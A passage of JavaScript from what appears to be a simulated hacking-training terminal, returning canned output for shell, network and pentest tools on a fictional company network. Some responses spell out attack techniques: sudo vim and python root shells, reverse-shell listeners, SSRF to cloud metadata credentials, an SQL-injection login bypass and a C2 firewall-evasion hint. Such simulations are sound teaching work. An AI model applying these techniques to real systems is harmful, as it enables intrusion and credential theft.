  if (cmd === "id") return { output: "uid=1000(stranger) gid=1000(stranger) groups=1000(stranger),4(adm),27(sudo)", newCwd: cwd };
  if (cmd === "uptime") return { output: " 04:32:17 up 847 days, 11:04, 1 user, load average: 0.08, 0.03, 0.01", newCwd: cwd };
  if (cmd === "uname") return { output: args.includes("-a") ? "Linux axiom-kali 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-2kali1 x86_64 GNU/Linux" : "Linux", newCwd: cwd };
  if (cmd === "who" || cmd === "w") return { output: "stranger  pts/0  2024-11-15 04:29 (10.0.0.1)", newCwd: cwd };
  if (cmd === "last") return { output: "stranger  pts/0  10.0.0.1  Fri Nov 15 04:29  still logged in\nroot      tty1            Mon Jan 15 00:00 - down (847 days ago)\nwtmp begins Fri Jan 15 2021", newCwd: cwd };
  if (cmd === "groups") return { output: "stranger adm sudo netdev bluetooth", newCwd: cwd };
  if (cmd === "env") return { output: "USER=stranger\nHOME=/home/stranger\nSHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nAXIOM_KEY=xK8#mP2@nQ5$\nDB_HOST=10.0.0.10\nTERM=xterm-256color", newCwd: cwd };
  if (cmd === "echo") return { output: args.join(" ").replace(/\$(\w+)/g, (_,v)=>({PATH:"/usr/local/bin:/usr/bin:/bin",HOME:"/home/stranger",USER:"stranger",SHELL:"/bin/bash",AXIOM_KEY:"xK8#mP2@nQ5$",DB_HOST:"10.0.0.10"}[v]||"")), newCwd: cwd };
  if (cmd === "export" || cmd === "alias") return { output: "", newCwd: cwd };
  if (cmd === "which") return { output: args[0] ? `/usr/bin/${args[0]}` : "Usage: which <cmd>", newCwd: cwd };
  if (cmd === "locate") return { output: args[0] ? `/usr/share/${args[0]}\n/home/stranger/.local/${args[0]}` : "Usage: locate <file>", newCwd: cwd };
  if (cmd === "history") return { output: "(Command history shown above — use ↑↓ arrows to navigate)", newCwd: cwd };

  // cd
  if (cmd === "cd") {
    if (!args[0] || args[0] === "~") return { output: "", newCwd: "/home/stranger" };
    if (args[0] === "-") return { output: cwd, newCwd: cwd };
    const target = args[0].startsWith("/") ? args[0] : args[0] === ".." ? (cwd.split("/").slice(0,-1).join("/")||"/") : cwd + "/" + args[0];
    const norm = target.replace(/\/+/g,"/").replace(/\/$/,"") || "/";
    const valid = ["/","/home","/home/stranger","/home/stranger/Documents","/home/stranger/Desktop","/home/stranger/workspace",
      "/etc","/etc/network","/var","/var/log","/var/www","/var/www/html","/opt","/opt/recon","/opt/scan","/opt/exploit",
      "/opt/active-directory","/proc","/proc/1","/sys","/sys/firewall","/sys/net","/etc/crypto","/etc/defense",
      "/usr","/usr/share","/tmp","/root"];
    if (valid.some(v => norm.startsWith(v))) return { output: "", newCwd: norm };
    return { output: `cd: ${args[0]}: No such file or directory`, newCwd: cwd };
  }

  // ls
  if (cmd === "ls") {
    const flags = args.filter(a => a.startsWith("-")).join("");
    const showHidden = flags.includes("a");
    const long = flags.includes("l");
    const map = {
      "/home/stranger": ["Documents","Desktop","workspace",".bash_history",".bashrc",".secret",".ssh"],
      "/home/stranger/Documents": ["notes.txt","methodology.txt","shells.txt","hashing.txt","sqli_notes.txt"],
      "/home/stranger/Desktop": ["readme.txt","welcome.txt"],
      "/etc": ["passwd","shadow","hosts","crontab","sudoers","ssh","network","resolv.conf"],
      "/var/log": ["auth.log","syslog","apache2","kern.log"],
      "/var/www/html": ["index.php","config.php","login.php","robots.txt","admin","backup"],
      "/opt/recon": ["methodology.txt","google_dorking.txt","osint_notes.txt"],
      "/opt/scan": ["nmap_cheatsheet.txt","service_enum.txt"],
      "/opt/exploit": ["shells.txt","gtfobins.txt"],
      "/sys/firewall": ["rules.txt","escape.sh","dns_tunnel.txt"],
      "/": ["bin","boot","dev","etc","home","lib","opt","proc","root","sys","tmp","usr","var"],
    };
    // resolve optional path argument (first non-flag arg) against cwd
    const pathArg = args.find(a => !a.startsWith("-"));
    let target = cwd;
    if (pathArg) {
      const expanded = pathArg === "~" ? "/home/stranger" : pathArg.replace(/^~\//, "/home/stranger/");
      const raw = expanded.startsWith("/") ? expanded : cwd + "/" + expanded;
      target = raw.replace(/\/+/g,"/").replace(/(.)\/$/,"$1");
    }
    const items = map[target] || (pathArg ? null : ["(directory is empty)"]);
    if (!items) return { output: `ls: cannot access '${pathArg}': No such file or directory`, newCwd: cwd };
    const visible = showHidden ? items : items.filter(i => !i.startsWith("."));
    if (long) {
      const rows = visible.map(i => {
        const isDir = !i.includes(".");
        const hidden = i.startsWith(".");
        const perms = hidden ? "-rw-------" : isDir ? "drwxr-xr-x" : "-rw-r--r--";
        return `${perms}  stranger stranger ${Math.floor(Math.random()*4000+200)} Nov 15 04:29 ${i}`;
      });
      return { output: `total ${visible.length * 4}\n${rows.join("\n")}`, newCwd: cwd };
    }
    return { output: visible.join("  "), newCwd: cwd };
  }

  // file ops
  if (cmd === "mkdir") return { output: args[0] ? "" : "mkdir: missing operand", newCwd: cwd };
  if (cmd === "touch") return { output: "", newCwd: cwd };
  if (cmd === "rm")    return { output: "", newCwd: cwd };
  if (cmd === "cp" || cmd === "mv") return { output: args.length >= 2 ? "" : `${cmd}: missing operand`, newCwd: cwd };
  if (cmd === "chmod" || cmd === "chown") return { output: "", newCwd: cwd };
  if (cmd === "wc")    return { output: args[0] ? `      42     312    2048 ${args[args.length-1]}` : "Usage: wc [options] <file>", newCwd: cwd };
  if (cmd === "sort")  return { output: "(output sorted)", newCwd: cwd };
  if (cmd === "uniq")  return { output: "(duplicates removed)", newCwd: cwd };
  if (cmd === "cut")   return { output: args.includes("/etc/passwd") ? "root\ndaemon\nwww-data\nstranger\nmysql\nsvc_backup" : "(fields extracted)", newCwd: cwd };
  if (cmd === "file")  return { output: args[0] ? `${args[0]}: ASCII text` : "Usage: file <path>", newCwd: cwd };
  if (cmd === "strings") return { output: args[0] ? `/lib/libc.so.6\nELF\nAxiom Systems Binary v2.1\npassword=\nAxiom2024!\n10.0.0.100\ncorp.axiom.local\n[!] Interesting strings found in binary!` : "Usage: strings <file>", newCwd: cwd };
  if (cmd === "xxd" || cmd === "hexdump") return { output: "00000000: 7f45 4c46 0201 0100  .ELF....\n00000008: 0000 0000 0000 0000  ........", newCwd: cwd };
  if (cmd === "dd")    return { output: args.length ? "22548578304 bytes (23 GB) copied, 47.3 s, 477 MB/s" : "Usage: dd if=<src> of=<dst>", newCwd: cwd };

  // grep
  if (cmd === "grep") {
    const pattern = args.find(a => !a.startsWith("-")) || "";
    const lp = pattern.toLowerCase().replace(/'/g,"").replace(/"/g,"");
    if (lp.includes("password") || lp.includes("pass")) {
      return { output: `/home/stranger/.bashrc:export AXIOM_KEY="xK8#mP2@nQ5$"\n/home/stranger/.bash_history:mysql -h 10.0.0.10 -u root -pAxiom2021!\n/var/www/html/config.php:$db_pass = 'W3bC0nf!g2024';\n(3 results — credentials found)`, newCwd: cwd };
    }
    if (lp.includes("failed") || lp.includes("fail")) {
      return { output: `Nov 15 04:01:11 axiom-kali sshd: Failed password for root from 185.220.101.47\n[... 46,922 more entries ...]\n185.220.101.47     46923   ← botnet/tor exit node`, newCwd: cwd };
    }
    if (lp.includes("stranger") || lp.includes("1000")) {
      return { output: `stranger:x:1000:1000:,,,:/home/stranger:/bin/bash`, newCwd: cwd };
    }
    return { output: `(searched for '${pattern}' — no matches, or try a more specific pattern)`, newCwd: cwd };
  }

  // awk
  if (cmd === "awk") {
    if (input.includes("passwd")) return { output: "root\ndaemon\nwww-data\nstranger\nmysql\nsvc_backup", newCwd: cwd };
    if (input.includes("print $11") || input.includes("uniq -c")) return { output: "185.220.101.47   46923\n10.10.10.15          3\n(Sorted by frequency — 185.220.101.47 is your attacker)", newCwd: cwd };
    return { output: "(awk: pattern applied to input)", newCwd: cwd };
  }
  if (cmd === "sed") return { output: "(sed: substitution applied)", newCwd: cwd };

  // find
  if (cmd === "find") {
    const nameIdx = args.indexOf("-name");
    const permIdx = args.indexOf("-perm");
    const name = nameIdx >= 0 ? (args[nameIdx+1]||"").replace(/['"*]/g,"") : null;
    const perm = permIdx >= 0 ? args[permIdx+1] : null;
    if (perm && (perm.includes("s")||perm.includes("4000")||perm.includes("u=s"))) {
      return { output: "/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/vim\n/usr/bin/python3\n/usr/bin/find\n/bin/ping\n/usr/lib/openssh/ssh-keysign\n\n[!] vim, python3, find all have SUID — check gtfobins.txt!", newCwd: cwd };
    }
    if (name) {
      const ext = (name.split(".").pop()||"").toLowerCase();
      const m = {conf:"/etc/ssh/sshd_config\n/etc/apache2/apache2.conf\n/etc/mysql/mysql.conf.d/mysqld.cnf",bak:"/var/backup/server.conf.bak\n/var/backup/db_dump.sql.bak",php:"/var/www/html/index.php\n/var/www/html/config.php\n/var/www/html/login.php",txt:"/home/stranger/Documents/notes.txt\n/opt/recon/methodology.txt\n/sys/firewall/rules.txt",sh:"/opt/scripts/backup.sh\n/sys/firewall/escape.sh"};
      return { output: m[ext] || `(files matching '${name}' — check common locations)`, newCwd: cwd };
    }
    return { output: "(find: specify -name or -perm filter)", newCwd: cwd };
  }

  // sudo
  if (cmd === "sudo") {
    const sub = args.join(" ");
    if (sub.includes("-l")) return { output: "User stranger may run the following commands on axiom-kali:\n  (ALL) NOPASSWD: /usr/bin/vim\n  (ALL) NOPASSWD: /usr/bin/python3", newCwd: cwd };
    if (sub.startsWith("vim")) return { output: "[sudo] Running vim as root\n(Real usage: sudo vim -c ':!/bin/bash' gives root shell)\n[Simulated: root shell obtained — you have root]", newCwd: cwd };
    if (sub.startsWith("python")) return { output: "[sudo] Running python3 as root\n>>> import os; os.system('/bin/bash')\n[Simulated: root shell obtained]", newCwd: cwd };
    return { output: "[sudo] password for stranger: ", newCwd: cwd };
  }

  // su
  if (cmd === "su") return { output: args[0] === "root" ? "Password:\nsu: Authentication failure" : `su: user ${args[0]||"root"} does not exist`, newCwd: cwd };

  // systemctl
  if (cmd === "systemctl") {
    if (args[0] === "list-units" || args[0] === "list-unit-files") return { output: "UNIT                     LOAD   ACTIVE  SUB     DESCRIPTION\nssh.service              loaded active  running OpenBSD Secure Shell\napache2.service          loaded active  running The Apache HTTP Server\nmysql.service            loaded active  running MySQL Database Server\nfail2ban.service         loaded active  running Fail2Ban\naxiom-daemon.service     loaded active  running Axiom Systems Monitor\ncron.service             loaded active  running Command Scheduler", newCwd: cwd };
    if (args[0] === "status") return { output: `● ${args[1]||"ssh"}.service\n   Loaded: loaded\n   Active: active (running) since Fri 2024-01-15; 847 days ago\n   Main PID: 892`, newCwd: cwd };
    return { output: `${args[0]||"systemctl"}: ok`, newCwd: cwd };
  }
  if (cmd === "service") return { output: `${args[1]||"service"}: ok`, newCwd: cwd };
  if (cmd === "journalctl") return { output: "Nov 15 04:00:01 axiom-kali axiom-daemon: monitoring ACTIVE\nNov 15 04:01:11 axiom-kali sshd: Failed password for root from 185.220.101.47\nNov 15 04:29:34 axiom-kali sshd: Accepted publickey for stranger from 10.0.0.1\nNov 15 04:29:35 axiom-kali sudo: stranger: COMMAND=/bin/bash", newCwd: cwd };
  if (cmd === "crontab") return { output: args.includes("-l") ? "# stranger crontab — empty\n# System crontab: cat /etc/crontab" : "(crontab edited)", newCwd: cwd };

  // process commands
  if (cmd === "ps") return { output: "USER       PID %CPU %MEM COMMAND\nroot         1  0.0  0.1 /sbin/init\nroot       892  0.0  0.2 /usr/sbin/sshd -D\nroot      1105  0.0  0.3 /usr/sbin/apache2\nwww-data  1106  0.0  0.2 /usr/sbin/apache2 worker\nmysql     1201  0.3  7.2 /usr/sbin/mysqld\nroot      1847  0.0  0.1 /opt/axiom/axiom-daemon\nstranger  4471  0.1  0.5 -bash\nstranger  4502  0.0  0.1 ps aux", newCwd: cwd };
  if (cmd === "top" || cmd === "htop") return { output: "top - 04:32:17 up 847 days\nTasks: 142 total, 1 running, 141 sleeping\n%Cpu(s): 0.3 us, 0.1 sy\n\n  PID USER     %CPU %MEM COMMAND\n 1201 mysql     0.3  7.2 mysqld\n 1847 root      0.1  0.1 axiom-daemon\n 4471 stranger  0.1  0.5 bash\n\n[press q to quit]", newCwd: cwd };
  if (cmd === "kill" || cmd === "pkill") return { output: args.length ? "" : `Usage: ${cmd} [signal] <pid>`, newCwd: cwd };
  if (cmd === "pgrep") return { output: args[0] ? "892\n893" : "Usage: pgrep <name>", newCwd: cwd };
  if (cmd === "jobs" || cmd === "fg" || cmd === "bg") return { output: "", newCwd: cwd };

  // network
  if (cmd === "ip") {
    if (args[0]==="addr"||args[0]==="a") return { output: "1: lo: <LOOPBACK,UP> mtu 65536\n   inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500\n   link/ether 08:00:27:ab:12:34 brd ff:ff:ff:ff:ff:ff\n   inet 10.0.0.50/24 brd 10.0.0.255 scope global eth0", newCwd: cwd };
    if (args[0]==="route"||args[0]==="r") return { output: "default via 10.0.0.1 dev eth0 proto dhcp\n10.0.0.0/24 dev eth0 proto kernel scope link src 10.0.0.50", newCwd: cwd };
    if (args[0]==="link") return { output: "1: lo: <LOOPBACK,UP>\n   link/loopback 00:00:00:00:00:00\n2: eth0: <BROADCAST,MULTICAST,UP>\n   link/ether 08:00:27:ab:12:34", newCwd: cwd };
    return { output: "Usage: ip [addr|route|link|neigh]", newCwd: cwd };
  }
  if (cmd === "ifconfig") return { output: "eth0: flags=4163<UP,BROADCAST,RUNNING>\n  inet 10.0.0.50  netmask 255.255.255.0  broadcast 10.0.0.255\n  ether 08:00:27:ab:12:34\nlo: flags=73<UP,LOOPBACK,RUNNING>\n  inet 127.0.0.1  netmask 255.0.0.0", newCwd: cwd };
  if (cmd === "route") return { output: "Kernel IP routing table\nDestination  Gateway      Genmask        Flags  Iface\ndefault      10.0.0.1     0.0.0.0        UG     eth0\n10.0.0.0     0.0.0.0      255.255.255.0  U      eth0", newCwd: cwd };
  if (cmd === "arp") return { output: "Address           HWtype  HWaddress           Flags\n10.0.0.1          ether   aa:bb:cc:dd:ee:01   C     eth0\n10.0.0.10         ether   08:00:27:12:34:56   C     eth0\n10.0.0.20         ether   08:00:27:ab:cd:ef   C     eth0\n10.0.0.100        ether   08:00:27:ff:00:01   C     eth0", newCwd: cwd };
  if (cmd === "ping") {
    const tgt = args.find(a=>!a.startsWith("-"))||"";
    const cnt = args.includes("-c") ? parseInt(args[args.indexOf("-c")+1])||4 : 4;
    const known = ["10.0.0.1","10.0.0.10","10.0.0.20","10.0.0.100","127.0.0.1","localhost","8.8.8.8"];
    if (!tgt) return { output: "Usage: ping [-c count] <host>", newCwd: cwd };
    if (!known.includes(tgt)) return { output: `connect: Network is unreachable (firewall blocks egress to ${tgt})`, newCwd: cwd };
    const lines = Array.from({length:cnt},(_,i)=>`64 bytes from ${tgt}: icmp_seq=${i+1} ttl=64 time=${(Math.random()*2+0.3).toFixed(2)} ms`);
    return { output: `PING ${tgt}: 56 bytes\n${lines.join("\n")}\n--- ${tgt} ping stats ---\n${cnt} packets transmitted, ${cnt} received, 0% packet loss`, newCwd: cwd };
  }
  if (cmd === "traceroute" || cmd === "tracepath") return { output: `traceroute to ${args[0]||"?"} (${args[0]||"?"}), 30 hops max\n 1  10.0.0.1 (gateway)  0.42 ms\n 2  * * * (firewall drops ICMP after hop 1)\n(AXIOM-SECURE-V3 blocks further tracing)`, newCwd: cwd };
  if (cmd === "netstat") return { output: "Proto  Local Address          Foreign Address   State\ntcp    0.0.0.0:22             0.0.0.0:*         LISTEN\ntcp    127.0.0.1:3306         0.0.0.0:*         LISTEN\ntcp    0.0.0.0:80             0.0.0.0:*         LISTEN\ntcp    10.0.0.50:22           10.0.0.1:52341    ESTABLISHED\nudp    0.0.0.0:53             0.0.0.0:*", newCwd: cwd };
  if (cmd === "ss") return { output: "Netid  State   Local Address:Port  Peer Address:Port\ntcp    LISTEN  0.0.0.0:22          0.0.0.0:*\ntcp    LISTEN  127.0.0.1:3306      0.0.0.0:*\ntcp    LISTEN  0.0.0.0:80          0.0.0.0:*\ntcp    ESTAB   10.0.0.50:22        10.0.0.1:52341\nudp    UNCONN  0.0.0.0:53          0.0.0.0:*", newCwd: cwd };

  // curl
  if (cmd === "curl") {
    const url = args.find(a=>a.startsWith("http"))||"";
    const isHead = args.includes("-I")||args.includes("-i");
    if (!url) return { output: "Usage: curl [options] <url>", newCwd: cwd };
    if (url.includes("169.254.169.254")) return { output: "{\n  \"AccessKeyId\": \"ASIA4EXAMPLE3KEYID\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMIK7EXAMPLE\",\n  \"Token\": \"AQoDYXdzEJr...\"\n}\n\n[!] AWS IAM credentials exposed via SSRF to metadata endpoint!", newCwd: cwd };
    if (url.includes("robots.txt")) return { output: "User-agent: *\nDisallow: /admin\nDisallow: /backup\nDisallow: /internal\nDisallow: /.env\nDisallow: /api/v1\n\n[!] Disallowed paths tell attackers exactly where to look!", newCwd: cwd };
    if (url.includes("/admin") && args.includes("-d") && input.includes("admin'")) return { output: "HTTP/1.1 200 OK\n{\"status\":\"success\",\"message\":\"Login successful\",\"user\":\"admin\",\"role\":\"administrator\"}\n\n[+] SQL INJECTION SUCCESSFUL — admin'-- commented out the password check\n[+] Effective query: SELECT * FROM users WHERE username='admin'", newCwd: cwd };
    if (url.includes("/admin")) return { output: "HTTP/1.1 200 OK\n\n<!DOCTYPE html>\n<html>\n<head><title>AXIOM Admin Login</title></head>\n<body>\n<form method='POST' action='/admin/login.php'>\n  <input name='username'>\n  <input name='password' type='password'>\n</form>\n<!-- SQL: SELECT * FROM staff WHERE username='?' AND password='?' -->\n</body></html>", newCwd: cwd };
    if (url.includes("/fetch.php") || url.includes("localhost/admin")) return { output: "HTTP/1.1 200 OK\n\n[SSRF] Server fetched: http://localhost/admin\nReturned internal admin page — bypassed external access controls!\n\n[!] SSRF confirmed — server will fetch any URL you provide", newCwd: cwd };
    if (url.includes("/.env")) return { output: "DB_HOST=localhost\nDB_USER=root\nDB_PASS=AxiomDB2024!\nAPP_SECRET=xK8#mP2@nQ5$\nAWS_KEY=AKIA4EXAMPLE\n\n[!] .env file publicly accessible — all application secrets exposed!", newCwd: cwd };
    if (isHead) return { output: "HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)\nX-Powered-By: PHP/7.4.3\nSet-Cookie: PHPSESSID=abc; path=/; HttpOnly\n\n[!] Server version leaked (Apache/2.4.41)\n[!] PHP version leaked\n[!] Session cookie missing Secure flag", newCwd: cwd };
    if (url.includes("https://")) return { output: "HTTP/1.1 200 OK\nStrict-Transport-Security: max-age=31536000\n\n(HTTPS egress works — port 443 allowed by firewall)\n\n[!] Useful: HTTPS C2 on port 443 would bypass AXIOM firewall", newCwd: cwd };
    return { output: "HTTP/1.1 200 OK\n\n<!DOCTYPE html>\n<html>\n<head><title>Axiom Systems Internal</title></head>\n<body>\n<h1>Axiom Systems — Internal Network</h1>\n<!-- TODO: remove debug endpoint /api/v1/debug before launch -->\n</body></html>", newCwd: cwd };
  }

  // wget
  if (cmd === "wget") return { output: args[0] ? `--2024-11-15 04:32:17-- ${args[0]}\nResolving... done.\nHTTP request sent... 200 OK\nSaved: '${args[0].split("/").pop()}'` : "Usage: wget <url>", newCwd: cwd };

  // nc/netcat
  if (cmd === "nc" || cmd === "netcat") {
    const listen = args.some(a=>a.includes("l"));
    const port = args.find(a=>/^\d+$/.test(a))||"4444";
    if (listen) return { output: `Listening on 0.0.0.0 ${port}...\n(In real usage: your reverse shell would connect here)\nconnect to [10.0.0.50] from [10.0.0.10] 41234\nbash: no job control\nwww-data@axiom-server:/var/www/html$`, newCwd: cwd };
    const host = args.find(a=>a.match(/^\d+\.\d+/));
    if (host) {
      const services = {"22":"SSH-2.0-OpenSSH_8.2p1 Ubuntu","25":"220 mail.axiom.local ESMTP","80":"HTTP/1.0 400 Bad Request","3306":"MySQL 5.7.42"};
      return { output: services[port] || `Connection to ${host} ${port} port [tcp/*] succeeded!`, newCwd: cwd };
    }
    return { output: "Usage: nc [-lvnp port] or nc [host] [port]", newCwd: cwd };
  }

  // nmap
  if (cmd === "nmap") {
    const tgt = args.find(a=>!a.startsWith("-")&&(a.includes(".")||a.includes("/")));
    if (!tgt) return { output: "Usage: nmap [options] <target>", newCwd: cwd };
    if (input.includes("-sn")||input.includes("sn")) return { output: "Starting Nmap 7.94\nNmap scan report for gateway.axiom.local (10.0.0.1)\nHost is up (0.0012s latency).\nNmap scan report for target.axiom.local (10.0.0.10)\nHost is up (0.0028s latency).\nNmap scan report for server2.axiom.local (10.0.0.20)\nHost is up (0.0031s latency).\nNmap scan report for dc.corp.axiom.local (10.0.0.100)\nHost is up (0.0041s latency).\nNmap done: 4 hosts up scanned in 3.47 seconds", newCwd: cwd };
    if (input.includes("vuln")) return { output: `Starting Nmap 7.94\nNmap scan report for ${tgt}\nPORT   STATE SERVICE\n80/tcp open  http\n| http-vuln-cve2021-41773:\n|   VULNERABLE: Apache Path Traversal & RCE\n|     CVE: CVE-2021-41773  CVSS3: 9.8 CRITICAL\n3306/tcp open  mysql\n| mysql-empty-password:\n|_  root account has empty password\n\n[!] Critical vulnerabilities found`, newCwd: cwd };
    if (input.includes("http-enum")) return { output: `PORT 80/tcp open http\n| http-enum:\n|   /admin/: Admin panel (401)\n|   /.env: Possible credentials file\n|   /robots.txt: Robots file\n|   /backup/: Directory\n|_  /api/v1/: API endpoint`, newCwd: cwd };
    if (input.includes("smb")) return { output: `PORT    STATE SERVICE\n445/tcp open  microsoft-ds\n| smb-enum-shares:\n|   ADMIN$: Access: DENIED\n|   C$: Access: DENIED\n|   IPC$: Access: READ\n|_  Public: Access: READ (no password!)`, newCwd: cwd };
    if (input.includes("-A")||(input.includes("-sC")&&input.includes("-sV"))) return { output: `Starting Nmap 7.94\nNmap scan report for ${tgt}\nHost is up.\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu\n| ssh-hostkey:\n|   3072 aa:bb:cc (RSA)\n80/tcp   open  http     Apache httpd 2.4.41\n|_http-title: Axiom Systems Internal\n| http-robots.txt: 4 disallowed entries\n|_ /admin /backup /internal /api/v1\n3306/tcp open  mysql    MySQL 5.7.42\n| mysql-info:\n|_  Version: 5.7.42, Status: Autocommit\nOS: Linux 5.4 (Ubuntu 20.04)\nNmap done: 1 IP address scanned in 12.33 seconds`, newCwd: cwd };
    if (input.includes("-sV")) return { output: `Starting Nmap 7.94\nNmap scan report for ${tgt}\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.9\n80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))\n3306/tcp open  mysql    MySQL 5.7.42-0ubuntu0.18.04.1\nNmap done in 6.49 seconds`, newCwd: cwd };
    if (input.includes("-sC")) return { output: `Starting Nmap 7.94\nNmap scan report for ${tgt}\nPORT     STATE SERVICE\n22/tcp   open  ssh\n| ssh-hostkey:\n|   3072 aa:bb:cc (RSA)\n80/tcp   open  http\n|_http-title: Axiom Systems Internal\n|_http-server-header: Apache/2.4.41\n3306/tcp open  mysql\n| mysql-info:\n|_  Status: Autocommit\nNmap done in 8.14 seconds`, newCwd: cwd };
    return { output: `Starting Nmap 7.94\nNmap scan report for ${tgt}\nNot shown: 997 closed tcp ports\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\nNmap done: 1 IP address scanned in 1.89 seconds`, newCwd: cwd };
  }

  // dns tools
  if (cmd === "dig") {
    const hasAxfr = input.includes("axfr");
    const dom = args.find(a=>!a.startsWith("-")&&!a.startsWith("@")&&a!=="axfr")||"target.machine";
    if (hasAxfr) return { output: `; Zone Transfer for ${dom}\n${dom}.     86400 IN SOA  ns1.${dom}. admin.${dom}.\n${dom}.     86400 IN A    10.0.0.10\nwww.${dom}.  86400 IN A    10.0.0.10\nmail.${dom}. 86400 IN A    10.0.0.15\nvpn.${dom}.  86400 IN A    10.0.0.20\nadmin.${dom}.86400 IN A    10.0.0.10\ndev.${dom}.  86400 IN A    10.0.0.30\nbackup.${dom}.86400 IN A   10.0.0.40\n\n[!] Zone transfer succeeded! DNS misconfiguration.`, newCwd: cwd };
    const type = args.find(a=>["A","AAAA","MX","NS","TXT","SOA","CNAME"].includes(a.toUpperCase()))||"A";
    const recs = {A:`${dom}. 300 IN A 10.0.0.10`,MX:`${dom}. 300 IN MX 10 mail.${dom}.`,NS:`${dom}. 86400 IN NS ns1.${dom}.\n${dom}. 86400 IN NS ns2.${dom}.`,TXT:`${dom}. 300 IN TXT "v=spf1 ip4:10.0.0.0/24 -all"`,SOA:`${dom}. 86400 IN SOA ns1.${dom}. admin.${dom}. 2024111501 3600`};
    return { output: `; <<>> DiG 9.18 <<>> ${dom} ${type}\n;; ANSWER SECTION:\n${recs[type.toUpperCase()]||recs["A"]}\n;; Query time: 3 msec`, newCwd: cwd };
  }
  if (cmd === "nslookup") return { output: args[0] ? `Server: 8.8.8.8\nAddress: 8.8.8.8#53\n\nNon-authoritative answer:\nName: ${args[0]}\nAddress: 10.0.0.10` : "Usage: nslookup <host>", newCwd: cwd };
  if (cmd === "host") return { output: args[0] ? `${args[0]} has address 10.0.0.10\n${args[0]} mail is handled by 10 mail.${args[0]}.` : "Usage: host <domain>", newCwd: cwd };
  if (cmd === "whois") return { output: args[0] ? `Domain Name: ${args[0].toUpperCase()}\nRegistrar: example-registrar.com\nCreated: 2021-03-15\nUpdated: 2024-01-10\nExpiry:  2026-03-15\n\nRegistrant Organization: AXIOM SYSTEMS LTD\nRegistrant Country: IE\nRegistrant Email: domains@axiom-systems.com\n\nName Server: NS1.AXIOM-SYSTEMS.COM\n\n[Note: Registrant is AXIOM SYSTEMS LTD — target confirmed]` : "Usage: whois <domain>", newCwd: cwd };
  if (cmd === "dnsrecon") return { output: args.length ? `[*] General enumeration: ${args[args.indexOf("-d")+1]||args[1]}\n[*] SOA ns1.target.machine 10.0.0.10\n[*] A   target.machine 10.0.0.10\n[*] A   www.target.machine 10.0.0.10\n[*] A   mail.target.machine 10.0.0.15\n[*] A   vpn.target.machine 10.0.0.20\n[*] A   admin.target.machine 10.0.0.10\n[*] A   dev.target.machine 10.0.0.30\n[*] MX  target.machine mail.target.machine` : "Usage: dnsrecon -d <domain>", newCwd: cwd };

  // tcpdump
  if (cmd === "tcpdump") {
    if (args.includes("-r")) return { output: "reading from capture.pcap\n04:32:17 HTTP GET /login.php\n04:32:18 POST /login.php username=admin&password=CorpPass2021\n\n[!] Cleartext HTTP credentials captured!\n    username: admin | password: CorpPass2021", newCwd: cwd };
    if (args.includes("-w")) return { output: "tcpdump: listening on eth0\n847 packets captured\n0 packets dropped by kernel\n(saved to capture.pcap)", newCwd: cwd };
    if (input.includes("port 80")) return { output: "tcpdump: listening on eth0\n04:32:17 HTTP GET /admin/login.php\n04:32:18 POST /admin/login.php [username=admin&password=CorpPass2021]\n04:32:18 HTTP 302 Location: /admin/dashboard\n[!] Plaintext credentials intercepted — port 80 unencrypted\n^C", newCwd: cwd };
    return { output: "tcpdump: listening on eth0\n04:32:17 IP 10.0.0.1 > 10.0.0.50: ICMP echo request\n04:32:17 IP 10.0.0.50 > 10.0.0.1: ICMP echo reply\n(capturing... ^C to stop)", newCwd: cwd };
  }

  // web tools
  if (cmd === "gobuster" || cmd === "dirb") return { output: `===============================================================\nGobuster v3.6\n[+] Url: ${args.find(a=>a.startsWith("http"))||"http://10.0.0.10/"}\n===============================================================\n/admin                (Status: 301)\n/backup               (Status: 403)\n/api                  (Status: 301)\n/images               (Status: 301)\n/login.php            (Status: 200)\n/robots.txt           (Status: 200)\n/.env                 (Status: 200) ← credentials file!\n===============================================================`, newCwd: cwd };
  if (cmd === "nikto") return { output: `- Nikto v2.1.6\n+ Server: Apache/2.4.41 (Ubuntu)\n+ X-Content-Type-Options header not set\n+ PHP/7.4.3 version exposed\n+ Cookie PHPSESSID missing Secure flag\n+ /robots.txt: 4 entries (review manually)\n+ /admin/: Interesting directory\n+ /.env: Possible credentials file [!]\n+ 7915 requests: 8 items reported`, newCwd: cwd };
  if (cmd === "whatweb") return { output: args[0] ? `${args[0]} [200 OK] Apache[2.4.41], PHP[7.4.3], Title[Axiom Systems Internal], Cookie[PHPSESSID], X-Powered-By[PHP/7.4.3]` : "Usage: whatweb <url>", newCwd: cwd };

  // exploitation tools
  if (cmd === "sqlmap") return { output: `sqlmap 1.7.11\n\n[*] Testing: http://10.0.0.10/admin/login.php\n[*] Parameter 'username' is VULNERABLE!\n    Type: boolean-based blind\n    Type: time-based blind\n    Type: UNION query\n\n[*] Database: corpdb\n[*] Tables: users, sessions, config, logs\n\nDatabase: corpdb — Table: users\n+----+----------+-------------------+-------+\n| id | username | password          | role  |\n+----+----------+-------------------+-------+\n|  1 | admin    | AdminAxiom2024!   | admin |\n|  2 | jrich    | 5f4dcc3b... (MD5) | user  |\n\n[!] Admin plaintext password found in config table`, newCwd: cwd };
  if (cmd === "hydra") return { output: `Hydra v9.4\n\n[STATUS] 1024 tries/min\n[80][http-post-form] host: 10.0.0.10  login: admin  password: admin123\n\n1 valid password found!\nlogin: admin  password: admin123 (position 247 in rockyou.txt)`, newCwd: cwd };
  if (cmd === "hashcat") {
    if (input.includes("-m 0")) return { output: `hashcat v6.2.6\nHash.Mode: 0 (MD5)\n\n5f4dcc3b5aa765d61d8327deb882cf99:password\n\nStatus: Cracked\nSpeed: 847.3 MH/s\nRecovered: 1/1 (100%)`, newCwd: cwd };
